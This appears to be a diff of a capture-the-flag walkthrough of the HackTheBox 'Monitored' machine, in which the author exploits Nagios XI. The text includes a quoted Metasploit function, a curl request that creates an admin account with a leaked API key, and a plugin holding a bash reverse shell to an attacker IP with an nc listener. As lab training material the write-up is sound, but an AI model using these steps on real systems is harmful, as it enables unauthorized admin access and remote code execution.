@@ -78,11 +78,11 @@ Based on the above output, we can see that `ffuf` discovered 2 new directories: 
 
 It seems that `/nagios` is some sort of another login portal:
 
-![](nagios_subdir.png)
+![](nagios_subdir.png){: .normal width="65%"}
 
 Unfortunately, we don't have any credentials at the moment. We can always try searching for default credentials used in Nagios XI:
 
-![](nagios_def_creds.png)
+![](nagios_def_creds.png){: .normal width="65%"}
 
 Unfortunately, that did not work! Next, we can try perform a **Hail Mary** scan using [incursore](https://github.com/wirzka/incursore) and see what we get back:
 
@@ -273,7 +273,7 @@ From those, we can further explore:
 
 The `/terminal` directory requires credentials, and the ones we currently have do not work:
 
-![](terminal_login.png)
+![](terminal_login.png){: .normal width="65%"}
 
 Next, we can recursively scan with the `/api` directory. It turns out that `/api/includes` does not have other subdirectories, but when it starts scanning the `/api/v1` subdirectory it returns the following:
 
@@ -434,9 +434,41 @@ The `xi_users` table contains the hashed password (`$2a$10$825c1eec29c150b118fe7
 
 After searching how the API key is used on Nagios XI, we find [this](https://assets.nagios.com/downloads/nagiosxi/docs/Automated_Host_Management.pdf):
 
-> _An example of a CURL command used to access the API is as follows: `curl -XGET "http://10.25.5.2/nagiosxi/api/v1/system/status?apikey=5goacg8s&pretty=1"`._
+> _An example of a CURL command used to access the API is as follows:_
+>
+> `curl -XGET "http://10.25.5.2/nagiosxi/api/v1/system/status?apikey=5goacg8s&pretty=1"`
 
-Let's try this to send a `POST` request:
+After some more searching, we find out that we can [add a user](https://support.nagios.com/forum/viewtopic.php?f=16&t=42923) via the Backbend API:
+
+> _You can use the new REST API to add users:_ 
+>
+> `curl -XPOST "http://x.x.x.x/nagiosxi/api/v1/system/user?apikey=LTltbjobR0X3V5ViDIitYaI8hjsjoFBaOcWYukamF7oAsD8lhJRvSPWq8I3PjTf7&pretty=1" -d "username=jmcdouglas&password=test&name=Jordan%20McDouglas&email=jmcdouglas@localhost"`
+
+That's interesting, but we need a bit more than that. We already have a user, but we need to create a privileged user, not just any user. There is a [Metasploit module](https://www.exploit-db.com/exploits/44969) that seems to automate this whole process, including an interesting function:
+
+```bash
+def try_add_admin(key, username, passwd)
+    vprint_status "STEP 3: trying to add admin user with key #{key}"
+    res = send_request_cgi({
+      'uri'=> "/nagiosxi/api/v1/system/user",
+      'method' => 'POST',
+      'ctype' => 'application/x-www-form-urlencoded',
+      'vars_get' => {
+        'apikey' => key,
+        'pretty' => 1
+      },
+      'vars_post' =>{
+        'username'   => username,
+        'password'   => passwd,
+        'name'       => rand_text_alpha(rand(5) + 5),
+        'email'      =>"#{username}@localhost",
+        'auth_level' =>'admin',
+        'force_pw_change' => 0
+      }
+    })
+```
+
+We can now try to create a new user using the parameters we have found before plus the `auth_level=admin`:
 
 ```bash
 curl -s -XPOST "http://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=xhi4m&password=password&name=xhi4m&email=xhi4m@mail.com&auth_level=admin"
@@ -450,10 +482,9 @@ We successfully created the user `xhi4m` with `admin` privileges! Let's login:
 
 ![](login_xhi4m.png)
 
-There is some detail documentation on how to create and execute a command: [Managing plugins in Nagios XI](https://assets.nagios.com/downloads/nagiosxi/docs/Managing-Plugins-in-Nagios-XI.pdf). According to the documentation the process is as follows:
+Now that we have elevated privileges, we can search if we can leverage any kind of [SSTI vulnerability](https://portswigger.net/web-security/server-side-template-injection). After reading a lot of documentation, we managed to find a detailed kind of how Nagios XI plugins work: [Managing plugins in Nagios XI](https://assets.nagios.com/downloads/nagiosxi/docs/Managing-Plugins-in-Nagios-XI.pdf). According to the documentation, we can execute commands by using plugins. The process is as follows:
 
-The process is as follows:
-1. Upload the shell as a plugin.
+1. Upload the a reveshe shell script as a plugin.
 2. Create a command which will execute the plugin.
 3. Create a service to run the command.
 
@@ -464,7 +495,7 @@ $ cat check_command
 /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.11/1337 0>&1'
 ```
 
-If we did everything right and we execute the check command we should catch our reverse shell:
+If we did everything according to the documentation, and we then execute the check command, we should be able to catch our reverse shell:
 
 ```bash
 $ sudo nc -lvnp 1337
